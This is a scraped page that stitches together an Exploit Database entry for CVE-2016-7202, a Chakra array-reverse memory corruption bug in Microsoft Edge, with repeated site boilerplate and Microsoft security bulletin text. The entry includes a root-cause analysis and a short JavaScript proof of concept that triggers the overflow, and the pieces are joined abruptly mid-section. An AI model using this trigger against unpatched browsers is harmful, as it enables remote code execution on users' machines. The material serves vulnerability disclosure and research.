Name: Microsoft Edge Scripting Engine Memory Corruption Vulnerability (MS16-129)
CVE: CVE-2016-7202
Vendor Website: http://www.microsoft.com/
Date Released: 09/11/2016
Affected Software: Microsoft Windows 10, Microsoft Windows Server 2016
Researchers: Scott Bell

Description

A memory corruption vulnerability was identified in the Microsoft Edge Chakra JavaScript engine which could
allow a malicious user to remotely execute arbitrary code on a vulnerable user’s machine, in the context of the
current user.

Exploitation

Exploitation of this vulnerability requires a user to visit a page containing specially crafted JavaScript. Users can
generally be lured to visit web pages via email, instant message or links on the internet. Vulnerabilities like this
are often hosted on legitimate websites which have been compromised by other means.

The following table shows some cursory debug information:

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

There is an overflow when reversing arrays in Chakra.

On line 5112 of JavascriptArray::EntryReverse, the length of the array is fetched and stored. It is then passed as a parameter into JavascriptArray::ReverseHelper, which then calls FillFromPrototypes, which can change the size of the array. If the size of the array is set to be larger than it was when the length was fetched, the calculation of the array segment head left value on line 5219:

     seg->left = ((uint32)length) - (seg->left + seg->length);

Can become a very large value (as length is larger than seg->length and seg->left is generally 0). This can cause the segment length to become larger than the segment size the next time SparseArraySegmentBase::EnsureSizeInBound is called, as the method contains the following code:

        uint32 nextLeft = next ? next->left : JavascriptArray::MaxArrayLength;
        Assert(nextLeft > left);

        if(size != 0)
        {

            size = min(size, nextLeft - left);
        }

nextLeft can be smaller than the segment length if next is null and left is very large, leading size to be set to a small value which is less than the segment length. Many other methods, including setting an element of an array assume that size is less than length, and often allocate size bytes then copy length bytes, leading to an overflow if length is actually more than size.

A minimal PoC is as follows:

var a = [1];
a.length = 1000;
var j = [];

var o = {};
  Object.defineProperty(o, '1', {
    get: function() {
      a.length = 1002;
      j.fill.call(a, 7.7);
      return 2;
    }
  });

a.__proto__ = o;

var r = j.reverse.call(a);
r.length = 0xfffffffe;
r[0xfffffffe - 1] = 10;

A full PoC is attached. Note that this PoC sometimes needs to be refreshed a few times to cause a crash.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## In this article

## Cumulative Security Update for Internet Explorer (3204059)

Published: December 13, 2016

**Version:** 1.0

## Executive Summary

This security update resolves vulnerabilities in Internet Explorer. The most severe of the vulnerabilities could allow remote code execution if a user views a specially crafted webpage using Internet Explorer. An attacker who successfully exploited the vulnerabilities could gain the same user rights as the current user. If the current user is logged on with administrative user rights, an attacker could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

This security update is rated Critical for Internet Explorer 9 (IE 9), and Internet Explorer 11 (IE 11) on affected Windows clients, and Moderate for Internet Explorer 9 (IE 9), Internet Explorer 10 (IE 10), and Internet Explorer 11 (IE 11) on affected Windows servers. For more information, see the **Affected Software** section.

The update addresses the vulnerabilities by correcting how:

* Microsoft browser and affected components handle objects in memory
* Microsoft browser checks Same Origin Policy for scripts running inside Web Workers
* Scripting engines handle objects in memory

For more information about the vulnerabilities, see the **Vulnerability Information** section.

For more information about this update, see [Microsoft Knowledge Base Article 3204059](https://support.microsoft.com/kb/3204059).

## Affected Software

The following software versions or editions are affected. Versions or editions that are not listed are either past their support life cycle or are not affected. To determine the support life cycle for your software version or edition, see [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

The severity ratings indicated for each affected software assume the potential maximum impact of the vulnerability. For information regarding the likelihood, within 30 days of this security bulletinâs release, of the exploitability of the vulnerability in relation to its severity rating and security impact, please see the Exploitability Index in the [December bulletin summary](https://technet.microsoft.com/library/security/ms16-dec).

**Note** Please see the [Security Update Guide](https://portal.msrc.microsoft.com/security-guidance) for a new approach to consuming the security update information. You can customize your views and create affected software spreadsheets, as well as download data via a restful API. For more information, please see the [Security Updates Guide FAQ](https://portal.msrc.microsoft.com/security-guidance). As a reminder, the Security Updates Guide will be replacing security bulletins as of February 2017. Please see our blog post, [Furthering our commitment to security updates](https://blogs.technet.microsoft.com/msrc/2016/11/08/furthering-our-commitment-to-security-updates/), for more details.

## Vulnerability Information

## Multiple Information Disclosure Vulnerabilities

Information disclosure vulnerabilities exist in the way that the affected components handle objects in memory. An attacker who successfully exploited these vulnerabilities could obtain information to further compromise a target system.

In a web-based attack scenario an attacker could host a website in an attempt to exploit the vulnerabilities. Additionally, compromised websites and websites that accept or host user-provided content could contain specially crafted content that could be used to exploit the vulnerabilities. However, in all cases an attacker would have no way to force users to view attacker-controlled content. Instead, an attacker would have to convince users to take action. For example, an attacker could trick users into clicking a link that takes them to the attacker's site.

The following table contains links to the standard entry for each vulnerability in the Common Vulnerabilities and Exposures list:

| **Vulnerability title** | **CVE number** | **Publicly disclosed** | **Exploited** |
| --- | --- | --- | --- |
| Windows Hyperlink Object Library Information Disclosure Vulnerability | [CVE-2016-7278](https://www.cve.org/CVERecord?id=CVE-2016-7278) | No | No |
| Microsoft Browser Information Disclosure Vulnerability | [CVE-2016-7282](https://www.cve.org/CVERecord?id=CVE-2016-7282) | Yes | No |
| Internet Explorer Information Disclosure Vulnerability | [CVE-2016-7284](https://www.cve.org/CVERecord?id=CVE-2016-7284) | No | No |

### Mitigating Factors

Microsoft has not identified any [mitigating factors](https://technet.microsoft.com/library/security/dn848375.aspx) for these vulnerabilities.

### Workarounds

Microsoft has not identified any [workarounds](https://technet.microsoft.com/library/security/dn848375.aspx) for these vulnerabilities.

## Multiple Microsoft Browser Memory Corruption Vulnerabilities

Remote code execution vulnerabilities exist when Microsoft Browsers improperly accesses objects in memory. These vulnerabilities could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. An attacker who successfully exploited these vulnerabilities could gain the same user rights as the current user. If the current user is logged on with administrative user rights, the attacker could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

An attacker could host a specially crafted website that is designed to exploit these vulnerabilities through Microsoft browsers, and then convince a user to view the website. The attacker could also take advantage of compromised websites, or websites that accept or host user-provided content or advertisements, by adding specially crafted content that could exploit these vulnerabilities. In all cases, however, an attacker would have no way to force users to view the attacker-controlled content. Instead, an attacker would have to convince users to take action, typically by an enticement in an email or Instant Messenger message, or by getting them to open an attachment sent through email.

The update addresses these vulnerabilities by modifying how Internet Explorer handles objects in memory.

The following table contains links to the standard entry for each vulnerability in the Common Vulnerabilities and Exposures list:

| **Vulnerability title** | **CVE number** | **Publicly disclosed** | **Exploited** |
| --- | --- | --- | --- |
| Microsoft Browser - Memory Corruption Vulnerability | [CVE-2016-7279](https://www.cve.org/CVERecord?id=CVE-2016-7279) | No | No |
| Internet Explorer Memory Corruption Vulnerability | [CVE-2016-7283](https://www.cve.org/CVERecord?id=CVE-2016-7283) | No | No |

### Mitigating Factors

Microsoft has not identified any [mitigating factors](https://technet.microsoft.com/library/security/dn848375.aspx) for these vulnerabilities.

### Workarounds

Microsoft has not identified any [workarounds](https://technet.microsoft.com/library/security/dn848375.aspx) for these vulnerabilities.

### FAQ

**I am running Internet Explorer on Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, or Windows Server 2012 R2. Does this mitigate these vulnerabilities?**

Yes. By default, Internet Explorer on Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, and Windows Server 2012 R2 runs in a restricted mode that is known as [Enhanced Security Configuration](https://technet.microsoft.com/library/dd883248). Enhanced Security Configuration is a group of preconfigured settings in Internet Explorer that can reduce the likelihood of a user or administrator downloading and running specially crafted web content on a server. This is a mitigating factor for websites that you have not added to the Internet Explorer Trusted sites zone.

**Can EMET help mitigate attacks that attempt to exploit these vulnerabilities?**

Yes. The Enhanced Mitigation Experience Toolkit (EMET) enables users to manage security mitigation technologies that help make it more difficult for attackers to exploit memory corruption vulnerabilities in a given piece of software. EMET can help mitigate attacks that attempt to exploit these vulnerabilities in Internet Explorer on systems where EMET is installed and configured to work with Internet Explorer.

For more information about EMET, see the [Enhanced Mitigation Experience Toolkit](https://technet.microsoft.com/security/jj653751).

## Microsoft Browser Security Feature Bypass Vulnerability

A security feature bypass vulnerability exists when the Microsoft browsers fail to correctly apply Same Origin Policy for scripts running inside Web Workers.

An attacker could trick a user into loading a page with malicious content. To exploit this vulnerability, an attacker would need to trick a user into loading a page or visiting a site. The page could also be injected into a compromised site or ad network.

The update addresses the vulnerability by correcting the Same Origin Policy check for scripts running inside Web Workers.

The following table contains links to the standard entry for the vulnerability in the Common Vulnerabilities and Exposures list:

| **Vulnerability title** | **CVE number** | **Publicly disclosed** | **Exploited** |
| --- | --- | --- | --- |
| Microsoft Browser Security Feature Bypass Vulnerability | [CVE-2016-7281](https://www.cve.org/CVERecord?id=CVE-2016-7281) | Yes | No |

### Mitigating Factors

### Workarounds

Microsoft has not identified any [workarounds](https://technet.microsoft.com/library/security/dn848375.aspx) for this vulnerability.

## Multiple Scripting Engine Memory Corruption Vulnerabilities

Multiple remote code execution vulnerabilities exist in the way affected Microsoft scripting engines render when handling objects in memory in Microsoft browsers. The vulnerabilities could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. An attacker who successfully exploited the vulnerabilities could gain the same user rights as the current user. If the current user is logged on with administrative user rights, an attacker who successfully exploited the vulnerabilities could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit the vulnerabilities through a Microsoft browser and then convince a user to view the website. An attacker could also embed an ActiveX control marked "safe for initialization" in an application or Microsoft Office document that hosts the Edge rendering engine. The attacker could also take advantage of compromised websites, and websites that accept or host user-provided content or advertisements. These websites could contain specially crafted content that could exploit the vulnerabilities.

The security update addresses the vulnerabilities by modifying how the affected Microsoft scripting engines handle objects in memory.

The following table contains links to the standard entry for each vulnerability in the Common Vulnerabilities and Exposures list:

| **Vulnerability title** | **CVE number** | **Publicly disclosed** | **Exploited** |
| --- | --- | --- | --- |
| Scripting Engine Memory Corruption Vulnerability | [CVE-2016-7202](https://www.cve.org/CVERecord?id=CVE-2016-7202) | Yes | No |
| Scripting Engine Memory Corruption Vulnerability | [CVE-2016-7287](https://www.cve.org/CVERecord?id=CVE-2016-7287) | No | No |

## Cumulative Security Update for Microsoft Edge (3199057)

Published: November 8, 2016

**Version:** 1.0

## Executive Summary

This security update resolves vulnerabilities in Microsoft Edge. The most severe of the vulnerabilities could allow remote code execution if a user views a specially crafted webpage using Microsoft Edge. An attacker who successfully exploited the vulnerabilities could gain the same user rights as the current user. Customers whose accounts are configured to have fewer user rights on the system could be less impacted than users with administrative user rights.

This security update is rated Critical for Microsoft Edge on Windows 10 and Windows Server 2016. For more information, see the **Affected Software** section.

The update addresses the vulnerabilities by:

* modifying how Microsoft browsers handles objects in memory
* changing how the XSS filter in Microsoft browsers handle RegEx
* modifying how the Chakra JavaScript scripting engine handles objects in memory
* correcting how the Microsoft Edge parses HTTP responses

For more information about the vulnerabilities, see the **Vulnerability Information** section.

## Vulnerability Information

## Multiple Microsoft Browser Memory Corruption Vulnerabilities

Multiple remote code execution vulnerabilities exist in the way that Microsoft browsers handles objects in memory. The vulnerabilities could corrupt memory in a way that could allow an attacker to execute arbitrary code in the context of the current user.

In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit the vulnerabilities through Microsoft browsers and then convince a user to view the website. The attacker could also take advantage of compromised websites and websites that accept or host user-provided content or advertisements. These websites could contain specially crafted content that could exploit the vulnerabilities.

The security update addresses the vulnerabilities by modifying how affected scripting engine handles objects in memory.

## Multiple Scripting Engine Memory Corruption Vulnerabilities

A remote code execution vulnerability exists in the way affected Microsoft scripting engines render when handling objects in memory in Microsoft browsers. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. An attacker who successfully exploited the vulnerability could gain the same user rights as the current user. If the current user is logged on with administrative user rights, an attacker who successfully exploited the vulnerability could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit the vulnerability through a Microsoft browser and then convince a user to view the website. An attacker could also embed an ActiveX control marked "safe for initialization" in an application or Microsoft Office document that hosts the Edge rendering engine. The attacker could also take advantage of compromised websites, and websites that accept or host user-provided content or advertisements. These websites could contain specially crafted content that could exploit the vulnerability.

The security update addresses the vulnerabilities by modifying how the Chakra JavaScript scripting engine handles objects in memory.

## Microsoft Edge Spoofing Vulnerability CVE-2016-7209

A spoofing vulnerability exists when Microsoft Edge does not properly parse HTTP content. An attacker who successfully exploited this vulnerability could trick a user by redirecting the user to a specially crafted website. The specially crafted website could either spoof content or serve as a pivot to chain an attack with other vulnerabilities in web services.

To exploit the vulnerability, the user must click a specially crafted URL. In an email attack scenario, an attacker could send an email message containing the specially crafted URL to the user in an attempt to convince the user to click it.

In a web-based attack scenario, an attacker could host a specially crafted website designed to appear as a legitimate website to the user. However, the attacker would have no way to force the user to visit the specially crafted website. The attacker would have to convince the user to visit the specially crafted website, typically by way of enticement in an email or Instant Messenger message, and then convince the user to interact with content on the website. The update addresses the vulnerability by correcting how the Microsoft Edge parses HTTP responses.

## Microsoft Browser Information Disclosure Vulnerability CVE-2016-7227

An information disclosure vulnerability exists when (Internet Explorer/Edge/Scripting Engine) does not properly handle objects in memory. The vulnerability could allow an attacker to detect specific files on the user's computer. In a web-based attack scenario, an attacker could host a website that is used to attempt to exploit the vulnerability.

In addition, compromised websites and websites that accept or host user-generated content could contain specially crafted content that could exploit the vulnerability. In all cases, however, an attacker would have no way to force a user to view the attacker-controlled content. Instead, an attacker would have to convince users to take action. For example, an attacker could trick users into clicking a link that takes them to the attacker's site.

An attacker who successfully exploited the vulnerability could potentially read data that was not intended to be disclosed. Note that the vulnerability would not allow an attacker to execute code or to elevate a userâs rights directly, but the vulnerability could be used to obtain information in an attempt to further compromise the affected system. The update addresses the vulnerability by helping to restrict what information is returned to affected Microsoft browsers.
